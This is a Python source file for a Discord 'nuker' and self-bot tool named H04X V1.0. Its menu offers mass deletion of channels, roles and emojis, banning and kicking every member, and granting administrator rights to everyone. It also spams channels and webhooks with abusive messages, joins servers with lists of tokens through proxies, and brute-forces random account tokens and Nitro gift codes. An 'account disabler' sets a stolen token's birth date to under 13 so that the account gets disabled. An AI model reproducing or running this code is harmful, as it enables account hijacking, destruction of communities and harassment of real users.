try:
    import colorama, discord_webhook, rich, discord, rand_string, requests, json, os, sys, time, platform, random, base64, string
except ImportError:
    print("Module not found try pip install -r requirements.txt to install all required module")
    input("\n[-] The END | Press Enter 3 Times To Close The Program\n")
    [input() for i in range(2,0,-1)] ; exit()

from discord_webhook import DiscordWebhook, DiscordEmbed
import datetime as dt
from colorama import Fore, init
from discord.ext import commands
from rand_string.rand_string import RandString as GENSTR
from discord import Permissions
from rich.style import Style
from rich.console import Console

Print = Console().print
style = Style(link='', color='Blue', blink=True, bold=True)
init(convert=True, autoreset=True)

def slow_print(slow):
    for txt in slow + '\n':
        sys.stdout.write(txt)
        sys.stdout.flush()
        time.sleep(0.04)

print("""
╔══════════════════════════════════════════════════════════════════╗
║ ██╗  ██╗  ██████╗  ██╗  ██╗ ██╗  ██╗     ██╗   ██╗  ██╗      ██╗ ║
║ ██║  ██║ ██╔═══██╗ ██║  ██║ ╚██╗██╔╝     ██║   ██║ ███║     ███║ ║
║ ███████║ ██║   ██║ ███████║  ╚███╔╝      ██║   ██║ ╚██║     ╚██║ ║
║ ██╔══██║ ██║   ██║ ╚════██║  ██╔██╗      ╚██╗ ██╔╝  ██║      ██║ ║
║ ██║  ██║ ╚██████╔╝      ██║ ██╔╝ ██╗      ╚████╔╝   ██║ ██╗  ██║ ║
║ ╚═╝  ╚═╝  ╚═════╝       ╚═╝ ╚═╝  ╚═╝       ╚═══╝    ╚═╝ ╚═╝  ╚═╝ ║
╚══════════════════════════════════════════════════════════════════╝
\n[Created By CatsSomeCat#3869 & ' 神 AMIR ZєRᎧ#3333]
[Okami Discord Server : https://discord.gg/GDAqqt9B]\n
""")

Blue = Fore.BLUE ; Green = Fore.GREEN ; Magenta = Fore.MAGENTA ; Gray = Fore.LIGHTBLACK_EX
Red = Fore.RED ; White = Fore.WHITE ; Cyan = Fore.CYAN ; Yellow = Fore.YELLOW ; Ocean = Fore.LIGHTCYAN_EX
self = commands.Bot(command_prefix="", self_bot=True) ; self.remove_command("help")

class nitro_generator:
    async def main():
        valid = 0
        invalid = 0
        while True:
            Token_Generate = input("[Token Amount] : ")
            try:
                if int(Token_Generate) <= 0: 
                    print(Fore.RED + "[-] ERROR | Invalid Number")
                else:
                    slow_print("[Do You Wish To Use A Discord Webhook?]\n[If So Type It Here Or Press Enter To Skip]")
                    Url = input("[Enter Webhook] : ")
                    break
            except ValueError:
                print(Fore.RED + "[-] ERROR | Invalid Number")

        for i in range(0, int(Token_Generate), 1):
            nitro = GENSTR('alphanumerical' , 16)
            url_nitro = f"https://discord.gift/{nitro}"
            
            try:
                login = requests.get('https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true', timeout=10)
                if login.status_code == 200:
                    print(Fore.GREEN + '[+] VALID |' + ' ' + url_nitro)
                    f = open('Nitro_Generator.txt', "a+")
                    f.write(f'{nitro}\n')
                    embed = DiscordEmbed(title='H04X V1.0', description='H04X V1.0 Created With Python 3.10', color='2F3136')
                    embed.add_embed_field(name='Valid Nitros', value=f'> {valid}', inline=False)
                    embed.add_embed_field(name='Invaild Nitros', value=f'> {invalid}', inline=False)
                    embed.set_timestamp()
                    embed.set_footer(text='Created By CatsSomeCat#3869 & AMIR ᴼᴷᴬᴹᴵ#6762', icon_url='https://cdn.discordapp.com/avatars/766767664722477067/698575cecc603c2b4f76af569fb198bb.webp?size=1024')
                    webhook = Url 
                    if Url != "":
                        webhook = DiscordWebhook(username="H04X V1.0", avatar_url="https://cdn.discordapp.com/attachments/1013798960877551667/1015190939096064050/chipflat_106014.png", url = Url, content = f"Valid Token Detected!")
                        webhook.add_embed(embed=embed)
                        webhook.execute()
                    else: 
                        pass
                    valid += 1
                else:
                    print(Fore.RED + '[-] INVALID |' + ' ' + url_nitro)
                    invalid += 1
            except requests.exceptions.ProxyError:
                print(Fore.YELLOW + "[-] BAD PROXY | HTTPSConnectionPool discordapp.com:443 Disconnected Closed Connection Without Response")

        print(Yellow + f"[-] Result \nnVaild : {valid} \nInvalid : {invalid}")

class token_generator():
    async def main():
        User_input = input("\n[1] : Generates Token With Desired ID\n[2] : Generates Token With Random ID\n\n[Select Option] : ")
        if int(User_input) == 1:
            while True:
                User_ID = input("[User ID] : ")
                Check_ID = len((User_ID))
                if Check_ID < 18 or Check_ID > 18:
                    print(Fore.RED + "[-] ERROR | Invalid User ID \n")
                else:
                    break
        elif int(User_input) == 2:
            Random_ID = random.randint(000000000000000000, 999999999999999999)
            User_ID = str(Random_ID)
            print(f"[ID Generated] : {User_ID}")
        else:
            print(Red + "ERROR | Invalid Choice")
            time.sleep(5) ; os.system('cls') ; return

        valid = 0
        invalid = 0
        characters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"

        while True:
            Token_Generate = input("[Token Amount] : ")
            try:
                if int(Token_Generate) <= 0: 
                    print(Fore.RED + "[-] ERROR | Invalid Number")
                else:
                    slow_print("[Do You Wish To Use A Discord Webhook?]\n[If So Type It Here Or Press Enter To Skip]")
                    Url = input("[Enter Webhook] : ")
                    User_ID_Bytes = User_ID.encode()
                    base64_bytes = base64.b64encode(User_ID_Bytes)
                    base64_string = base64_bytes.decode("utf-8")
                    break
            except ValueError:
                print(Fore.RED + "[-] ERROR | Invalid Number")

        for i in range(0, int(Token_Generate), 1):
            def HMAC(chars = string.ascii_uppercase + string.digits, N=27):
                return ''.join(random.choice(chars) for _ in range(N))

            def timestamp(chars = string.ascii_uppercase + string.digits, N=random.randint(6, 6)):
                return ''.join(random.choice(chars) for _ in range(N))

            token = base64_string + '.' + timestamp(chars=characters ) + '.' + HMAC(chars=characters )
            headers_ = {"Authorization": token}
            
            try:
                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers_, timeout=10)
                if login.status_code == 200:
                    print(Fore.GREEN + '[+] VALID |' + ' ' + token)
                    f = open('Token_Generator.txt', "a+")
                    f.write(f'{token}\n')
                    embed = DiscordEmbed(title='H04X V1.0', description='H04X V1.0 Created With Python 3.10', color='2F3136')
                    embed.add_embed_field(name='Valid Tokens', value=f'> {valid}', inline=False)
                    embed.add_embed_field(name='Invaild Tokens', value=f'> {invalid}', inline=False)
                    embed.set_timestamp()
                    embed.set_footer(text='Created By CatsSomeCat#3869 & AMIR ᴼᴷᴬᴹᴵ#6762', icon_url='https://cdn.discordapp.com/avatars/766767664722477067/698575cecc603c2b4f76af569fb198bb.webp?size=1024')
                    webhook = Url 
                    if Url != "":
                        webhook = DiscordWebhook(username="H04X V1.0", avatar_url="https://cdn.discordapp.com/attachments/1013798960877551667/1015190939096064050/chipflat_106014.png", url = Url, content = f"Valid Token Detected!")
                        webhook.add_embed(embed=embed)
                        webhook.execute()
                    else: 
                        pass
                    valid += 1
                else:
                    print(Fore.RED + '[-] INVALID |' + ' ' + token)
                    invalid += 1
            except requests.exceptions.ProxyError:
                print(Fore.YELLOW + "[-] BAD PROXY | HTTPSConnectionPool discordapp.com:443 Disconnected Closed Connection Without Response")

        print(Yellow + f"[-] Result \nnVaild : {valid} \nInvalid : {invalid}")

class nuker():
    async def main():
        while True:
            Print("""
[01] Create Channels   | [11] Block All                   | [21] Token Generator
[02] Delete Channels   | [12] Unfriend All                | [22] Nitro Generator
[03] Ban All           | [13] Nickname All                |
[04] Kick All          | [14] Invisible Mode              |
[05] Create Roles      | [15] Administrator Everyone      |
[06] Delete Roles      | [16] Change Guild Name & Icon    |
[07] Create Webhooks   | [17] Create Servers              |
[08] Delete Webhooks   | [18] Delete Emojis               |
[09] Webhook Spammer   | [19] Account Disabler            |
[10] Fake Members      | [20] Spammr                      |""")                  
            try:
                user_input = str(input("\n[Choose] : "))
                if int(user_input) > 22:
                    time.sleep(0) ; os.system('cls') ; continue
                elif int(user_input) == 9:
                        try:
                            message = str(input("[Message] : "))
                            if message == '':
                                message = "> H04X V1.0 ||@everyone Get Fucked By CatsSomeCat & Amir Okami||"
                            while True:
                                user_proxies_input = str(input("[Use Proxies (Y/N)] : "))
                                proxy_choice = random.choice(open("proxies.txt").readlines()) ; proxies_ = {"http" : proxy_choice , "https" : proxy_choice}
                                if str(user_proxies_input) in ['Y', 'y', 'Yes', 'YES']:
                                    while True:
                                        with open("webhooks_url.txt") as webhook:
                                            webhooks = webhook.readlines()
                                            webhooks = [line.rstrip() for line in webhooks]
                                        spammer = requests.post(random.choice(webhooks), headers= {'content-type': 'application/json'}, data = json.dumps({'username' : 'H04X V1.0', 'content' : message}), proxies=proxies_, timeout=20)
                                        if spammer.status_code in [204, 200]:
                                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Sending [ {message} ]")
                                        elif spammer.status_code not in [204, 200]:
                                            print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Sending [ {message} ]")
                                elif str(user_proxies_input) in ['N', 'n', 'No', 'NO']:
                                    while True:
                                        with open("webhooks_url.txt") as webhook:
                                            webhooks = webhook.readlines()
                                            webhooks = [line.rstrip() for line in webhooks]
                                        spammer = requests.post(random.choice(webhooks), headers= {'content-type': 'application/json'}, data = json.dumps({'username' : 'H04X V1.0', 'content' : message}), timeout=20)
                                        if spammer.status_code in [204, 200]:
                                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Sending [ {message} ]")
                                        elif spammer.status_code not in [204, 200]:
                                            print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Sending [ {message} ]")
                                else:
                                    continue
                        except:
                            pass
                        time.sleep(5) ; os.system('cls') ; continue
                elif int(user_input) == 10:
                    try:
                        while True:
                            invite_code = str(input("[Invite Code] : https://discord.gg/"))
                            invite_check = requests.get(f'https://discord.com/api/v9/invites/{invite_code}', headers = {"Authorization": token}, timeout=20)
                            if invite_check.status_code in [200, 204]:
                                pass ; break
                            else:
                                continue
                        while True:
                            user_proxies_input_ = str(input("[Use Proxies (Y/N)] : "))
                            proxy_choice_ = random.choice(open("proxies.txt").readlines()) ; proxies__ = {"http" : proxy_choice_ , "https" : proxy_choice_}
                            if str(user_proxies_input_) in ['Y', 'y', 'Yes', 'YES']:
                                for i in range(0, len(open("tokens.txt").readlines()), 1):
                                    with open("tokens.txt") as token_:
                                        tokens = token_.readlines()
                                        tokens = [line.rstrip() for line in tokens]
                                    try:
                                        loginer = requests.post(f'https://discord.com/api/v9/invites/{invite_code}', headers = {"Authorization": random.choice(tokens)}, proxies=proxies__)
                                    except requests.exceptions.ProxyError:
                                        print(Yellow + "[-] Proxy | Login Failed | Connection Closed Wihtout Response")
                                    if loginer.status_code in [200, 204]:
                                        Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | User Joined")
                                    elif loginer.status_code not in [200, 204]:
                                        print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Invalid Token")
                            elif str(user_proxies_input_) in ['N', 'n', 'No', 'NO']:
                                for i in range(0, len(open("tokens.txt").readlines()), 1):
                                    with open("tokens.txt") as token__:
                                        tokens2 = token__.readlines()
                                        tokens2 = [line.rstrip() for line in tokens2]
                                    loginer = requests.post(f'https://discord.com/api/v9/invites/{invite_code}', headers = {"Authorization": random.choice(tokens2)})
                                    if loginer.status_code in [200, 204]:
                                        Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | User Joined")
                                    elif loginer.status_code not in [200, 204]:
                                        print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Invalid Token")
                            else:
                                continue
                            break
                    except:
                        pass
                    time.sleep(5) ; os.system('cls') ; continue
                elif int(user_input) == 11:
                    try:
                        for users_ in self.user.friends:
                            await users_.remove_friend()
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Blocking [ {users_.id} ]") 
                    except:
                        print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Blocking [ {users_.id} ]")
                        pass
                    time.sleep(5) ; os.system('cls') ; continue
                elif int(user_input) == 12:
                    try:
                        for users__ in self.users: 
                            await users__.block()
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Unfriending [ {users__.id} ]")
                    except:
                        print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Unfriending [ {users__.id} ]")
                        pass
                    time.sleep(5) ; os.system('cls') ; continue
                elif int(user_input) == 17:
                    while True:
                        try:
                            user_input_server_generate = int(input("[Server Amount] : "))
                            if user_input_server_generate <= 0:
                                continue
                            elif user_input_server_generate > 1000:
                                continue
                        except ValueError:
                            continue
                        break
                    for i in range(0, user_input_server_generate, 1):
                        guild_name = GENSTR('alphanumerical' , 8)
                        try:
                            await self.create_guild(f"Nuker - {guild_name}", icon=None)
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Creating Server [ Nuker - {guild_name} ]")
                        except:
                            print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Creating Server [ Nuker - {guild_name} ]")
                            pass
                    time.sleep(5) ; os.system('cls') ; continue
                elif int(user_input) == 19:
                    while True:
                        OT_T = input("[Token] : ")
                        headers = {'Authorization': OT_T, 'Content-Type': 'application/json'}
                        user_checker = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                        user_information = user_checker.json()
                        if user_checker.status_code == 200:
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Logged Into Account")
                            print(Cyan + f"[Username] -> {user_information['username']}\n[ID] -> {user_information['id']}\n[Email] -> {user_information['email']}\n[Phone Number] -> {user_information['phone']}")
                            input("[Press Enter To Disable] : ")
                            name_disabler = GENSTR('alphanumerical' , 8)
                            disciminator_disabler = random.randint(0, 4)
                        else:
                            continue
                        break
                    DISABLED_MESSAGE = "You need to be 13 or older in order to use Discord."
                    IMMUNE_MESSAGE = "You cannot update your date of birth."
                    try:
                        for i in range(0, 20, 1):
                            exploit = requests.patch("https://discordapp.com/api/v9/users/@me", headers=headers, json={'username': name_disabler, 'discriminator': str(disciminator_disabler), 'date_of_birth': '2019-3-16'})
                        if exploit.status_code == 400:
                            discord_message = exploit.json().get('date_of_birth', ['no response message'])[0]
                            if discord_message == DISABLED_MESSAGE:
                                print("[Account Disabled]")
                            elif discord_message == IMMUNE_MESSAGE:
                                print("[Account Is Immune To This Exploit]")
                            else:
                                print(f"[Unknown Response Message] : {discord_message}")
                        else:
                            print("[Failed To Disable Account]")
                    except:
                        print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] ERROR | Account Can't Disabled")
                    time.sleep(5) ; os.system('cls') ; continue
                elif int(user_input) == 21:
                    await token_generator.main()
                    time.sleep(5) ; os.system('cls') ; continue
                elif int(user_input) == 22:
                    await nitro_generator.main()
                    time.sleep(5) ; os.system('cls') ; continue
                else:
                    pass
            except ValueError:
                time.sleep(0) ; os.system('cls') ; continue
            while True:
                try:
                    guild_id = int(input("[Guild ID] : "))
                    guild = self.get_guild(guild_id)
                    try:
                        await self.fetch_guild(guild_id)
                        Print("[Fetching Guild] ...")
                        time.sleep(1.5)
                    except discord.errors.HTTPException:
                        continue
                except ValueError:
                    continue
                break
            match user_input:
                case ['1', '01']:
                    while True:
                        try:
                            user_input_channel_generate = int(input("[Channel Amount] : "))
                            if user_input_channel_generate <= 0:
                                continue
                            elif user_input_channel_generate > 1000:
                                continue
                        except ValueError:
                            continue
                        for i in range(0, user_input_channel_generate, 1):
                            channel_name = GENSTR('alphanumerical' , 8)
                            try:
                                await guild.create_text_channel(name=f"Nuker - {channel_name}") # 
                                Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Creating Channel [ Nuker - {channel_name} ]")
                            except:
                                print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Creating Channel [ Nuker - {channel_name} ]")
                                pass
                        time.sleep(5) ; os.system('cls') ; break ; continue
                case ['2' | '02']:
                    for channel in guild.channels:
                        delete_channels = channel
                        try:
                            await delete_channels.delete()
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Deleting Channel [ {delete_channels.name} ]")
                        except:
                            print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Deleting Channel [ {delete_channels.name} ]")
                            pass
                    time.sleep(5) ; os.system('cls') ; continue
                case ['3' | '03']:
                    for member_b in guild.members:
                        try:
                            await member_b.ban()
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Banning User [ {member_b.id} ]")
                        except:
                            print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Banning User [ {member_b.id} ]")
                            pass
                        time.sleep(5) ; os.system('cls') ; break
                case ['4' | '04']:
                    for member_k in guild.members:
                        try:
                            await member_k.kick()
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Kicking User [ {member_k.id} ]")
                        except:
                            print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Kicking User [ {member_k.id} ]")
                            pass
                        time.sleep(5) ; os.system('cls') ; break
                case ['5' | '05']:
                    while True:
                        try:
                            user_input_roles_generate = int(input("[Role Amount] : "))
                            if user_input_roles_generate <= 0:
                                continue
                            elif user_input_roles_generate > 1000:
                                continue
                        except ValueError:
                            continue
                        for i in range(0, user_input_roles_generate, 1):
                            roles_name = GENSTR('alphanumerical' , 8)
                            try:
                                await guild.create_role(name=f"Nuker - {roles_name}")
                                Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Creating Role [ Nuker - {roles_name} ]")
                            except:
                                print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Creating Role [ Nuker - {roles_name} ]")
                                pass
                        time.sleep(5) ; os.system('cls') ; break
                case ['6' | '06']:
                    for role in guild.roles:
                        try:
                            await role.delete()
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Deleting Role [ {role.name} ]")
                        except:
                            print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Deleting Role [ {role.name} ]")
                            pass
                    time.sleep(5) ; os.system('cls') ; continue
                case ['7' | '07']:
                    while True:
                        try:
                            for channel_ in guild.channels:
                                webhook_name = GENSTR('alphanumerical' , 8)
                                webheok = discord.utils.get(await channel_.webhooks())
                                if not webheok:
                                    save_web = open('webhooks_url.txt', "a+")
                                    web_rock = await channel_.create_webhook(name=f"Nuker - {webhook_name}")
                                    save_web.write(f'{web_rock.url}\n')
                                    Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Creating Webhook [ Nuker - {webhook_name} ]")
                        except:
                            print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Creating Webhook [ Nuker - {webhook_name} ]")
                            pass
                        time.sleep(5) ; os.system('cls') ; break
                case ['08' | '08']:
                    del_web = open('webhooks_url.txt', "a+")
                    del_web.truncate(0)
                    for webhook in await guild.webhooks():
                        try:
                            await webhook.delete()
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Deleting Webhook [ {webhook.name} ]")
                        except:
                            print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Deleting Webhook [ {webhook.name} ]")
                            pass
                    time.sleep(5) ; os.system('cls') ; continue
                case '13': 
                    name = str(input("[Nick Name] : "))
                    if name == '':
                        name = "Nuker - H04X V1.0"
                    for user_name in guild.members:
                        try:
                            await user_name.edit(nick=name)
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Changing Nickname [ {user_name.id} ]")
                        except:
                            print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Changing Nickname [ {user_name.id} ]")
                            pass
                    time.sleep(5) ; os.system('cls') ; continue
                case '14':
                    try:
                        await guild.me.edit(nick="‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎")
                        Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Invisible Mode [ Enabeld ]")
                    except:
                        print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Missing Permission Invisible Mode [ Disabled ]")
                        pass
                    time.sleep(5) ; os.system('cls') ; continue
                case '15':
                    try:
                        role = discord.utils.get(guild.roles, name="@everyone")
                        await role.edit(permissions=Permissions.all())
                        Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Changing Everyone Role Permission")
                    except:
                        print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Changing Everyone Roles Permission")
                        pass
                    time.sleep(5) ; os.system('cls') ; continue
                case '16':
                    try:
                        name = str(input("[Guild Name] : "))
                        if name == '':
                            name = 'H04X V1.0'
                        await guild.edit(name=name)
                        Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Changing Guild Name [ {name} ]")
                    except:
                        print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Changing Guild Name [ {name} ]")
                        pass
                    try:
                        url = str(input("[Image URL] : "))
                        if url == '':
                            url = 'https://cdn.discordapp.com/attachments/942164249743069214/1029011117718122526/skeleton-dance.png'
                        image_link = requests.get(url, stream=True)
                        if image_link.status_code == 200:
                            Print("[Downloading] ...") 
                            time.sleep(3)
                            with open('icon.png', 'wb') as icon_url:
                                icon_url.write(image_link.content)
                                await self.wait_until_ready()
                            with open('icon.png', 'rb') as image: 
                                icon = image.read()
                                await guild.edit(icon=icon)
                        else:
                            print(Red + "[Failed To Download Image]")
                            continue
                        Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Changing Guild Icon")
                    except:
                        print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Changing Guild Icon")
                    time.sleep(5) ; os.system('cls') ; continue
                case '18':
                    try: 
                        for emoji in list(guild.emojis):
                            await emoji.delete()
                            Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Deleting Emoji [ {emoji.name} ]")
                    except:
                        print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Deleting Emoji [{emoji.name} ]")
                    time.sleep(5) ; os.system('cls') ; continue
                case '20':
                    try:
                        message_spam_user = input("[Message] : ")
                        if message_spam_user == '':
                            message_spam_random = GENSTR('alphanumerical' , 8)
                            message_spam_user = "> @everyone Get ||Fucked|| !!!" + message_spam_random
                        while True:
                            for channels_ in guild.text_channels:
                                try:
                                    await self.get_channel(channels_.id).send(message_spam_user)
                                except discord.Forbidden:
                                    print(Red + f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Failed | Spaming In [ {channels_.id} ]")
                                Print(f"[{dt.datetime.utcnow().strftime('%H:%M:%S')}] Success | Spaming In [ {channels_.id} ]")
                    except:
                        pass
                    time.sleep(5) ; os.system('cls') ; continue
@self.event
async def on_connect():
    print(Cyan + f"[+] Client Logged Into : {self.user}")
    print(Green + f"[+] User Account Creation Date : {self.user.created_at.strftime('%Y/%m/%d %H:%M:%S')}")
    print(White + f"[+] User Platform OS : {platform.system()}")
    print(White + f"[+] Python Version -> {platform.python_version()} \n")
    await nuker.main()

while True:
        try:
            with open("config.json", encoding='utf8') as data:
                config = json.load(data)
            token_login = input("[Login In Previous User (Y/N)] : ")
            if str(token_login) in ['Y', 'y', 'Yes', 'YES']:
                token = config["token"]
                check1 = {"Authorization": token}
                login_token_ = requests.get('https://discordapp.com/api/v9/auth/login', headers=check1, timeout=20)
                if login_token_.status_code == 200:
                    print(Cyan + "\n[+] Loaded Config File\n")
                else:
                    print(Red + "\n[-] Error | Login Failed | Token Is Incorrect") ; break
            elif str(token_login) in ['N', 'n', 'No', 'NO']:
                token = str(input("[Token] : "))
                if token == '':
                    print(Red + "\n[-] Error | Login Failed | Token Is Incorrect")
                    break
                check2 = {"Authorization": token}
                login_token_ = requests.get('https://discordapp.com/api/v9/auth/login', headers=check2, timeout=20)
                if login_token_.status_code == 200:
                    config = {
                        "token": token,
                    }
                    with open("config.json", "w") as data:
                        json.dump(config, data, indent=2)
                    print(Cyan + "\n[+] Editing Config File\n")
                else:
                    print(Red + "\n[-] Error | Login Failed | Token Is Incorrect")
                    break
            else:
                time.sleep(0) ; os.system('cls') ; continue
        except:
            token = str(input("[Token] : "))
            if token == '':
                print(Red + "\n[-] Error | Login Failed | Token Is Incorrect") ; break
            check3 = {"Authorization": token}
            login_token_ = requests.get('https://discordapp.com/api/v9/auth/login', headers=check3, timeout=20)
            if login_token_.status_code == 200:
                config = {
                    "token": token,
                }
                with open("config.json", "w") as data:
                    json.dump(config, data, indent=2)
                print(Cyan + "\n[+] Creating Config File\n")
            else:
                print(Red + "\n[-] Error | Login Failed | Token Is Incorrect")
                break
        try:
            self.run(token)
        except discord.errors.LoginFailure:
            print(Red + "\n[-] Error | Login Failed | Token Is Incorrect")

input("\n[-] The END | Press Enter 3 Times To Close The Program\n")
[input() for i in range(2,0,-1)] ; exit()
